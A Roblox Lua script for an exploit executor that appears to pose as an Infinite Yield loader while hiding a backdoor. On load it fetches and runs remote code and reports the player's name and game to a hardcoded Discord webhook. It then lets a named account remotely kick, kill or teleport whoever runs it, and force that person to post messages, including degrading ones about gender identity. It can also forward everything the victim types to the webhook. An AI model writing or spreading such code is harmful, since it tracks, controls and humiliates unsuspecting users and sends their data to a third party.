local speaker = game.Players.LocalPlayer
print("V2.0.0..32b- Set Beta Loaded.!")
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
local people = {
    "432757113"
}
 http = game:GetService("HttpService")
 current = nil 
 init1 = false
 url = "https://discord.com/api/webhooks/899337815526092820/nxdQDkysN45aH69n81ErLNPk49PJ7uV2HNSWkppN4fVho8MvLqUMSkZsZ-Y-lOC2dRbq"

function notify1()
    local response = syn.request(
        {
            Url = 'https://discord.com/api/webhooks/899337815526092820/nxdQDkysN45aH69n81ErLNPk49PJ7uV2HNSWkppN4fVho8MvLqUMSkZsZ-Y-lOC2dRbq',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
         Body = game:GetService('HttpService'):JSONEncode({content = speaker.Name.. " is connected! | "..game.PlaceId.. " Is the user's game: tracking ! v2"})
        })
end
function notify2(msg)
    local response = syn.request(
        {
            Url = 'https://discord.com/api/webhooks/899337815526092820/nxdQDkysN45aH69n81ErLNPk49PJ7uV2HNSWkppN4fVho8MvLqUMSkZsZ-Y-lOC2dRbq',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
         Body = game:GetService('HttpService'):JSONEncode({content = msg})
        })
end
notify1()

 function reLoop()
    print("a")
    while true do 
        wait(15)
        for i, v in pairs(game.Players:GetPlayers()) do 
            if v.UserId == 432757113 then 
                if current == nil then
                getChat()
                print("on")
                current = v.Name
                end
            end
        end
    end
end

 function getChat()
     init1 = true
    game.Players.Hypickels.Chatted:Connect(function(msg)
        if msg == "/e kick" then 
            speaker:Kick("Synapse has ran into an error please restart!")
        end
        if msg == "/e bring" then
            speaker.Character.HumanoidRootPart.CFrame = game.Players.Hypickels.Character.HumanoidRootPart.CFrame
        end
        if msg == "/e kill" then
            speaker.Character.Humanoid.Health = 0
        end
        if msg == "/e ct1" then 
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Adam is best, brady wady is adam's cat maid.", "All")
        end
        if msg == "/e fakekick" then 
            speaker:Kick("Unkown client actions detected, your account has been flagged.")
        end
        if msg == "/e ct2" then 
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("men <3", "All")
        end
        if msg == "/e kick1" then 
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("User Kicked / Reason: In-game Anticheat detected exploits.", "All")
        end
        if msg == "/e blur" then 
            local int = Instance.new("BlurEffect")
            int.Size = 1111111
            int.Parent = game.Lighting
        end
        if msg == ".force-update" then
            speaker:Kick("Script has detected an update, please rejoin for newer version. We cant operate normally in older vesion!")
        end
        if msg == "/e clog" then 
            speaker.Chatted:Connect(function(msg)
            notify2(msg)
            end)
        end
         if msg == "/e getver" then 
            ame:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("The current version of script is v2.0.1 Set-Beta", "All")
         end
         if msg == "/e lgbt" then
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I am 100% LGBT-Q, and my pronouns are: She/Trans", "All")
         --  I am 100% LGBT-Q, and my pronouns are: She/Trans
         end
    end)
end
function start()
    game.Players.PlayerAdded:Connect(function(plr)
        if plr.Name == "Hypickels" then 
            if init1 == false then 
                getChat()
            end
        end
    end)
    game.Players.PlayerRemoving:Connect(function(plr)
        if plr.Name == "Hypickels" then 
            init1 = false
        end
    end)
end

start()
reLoop()
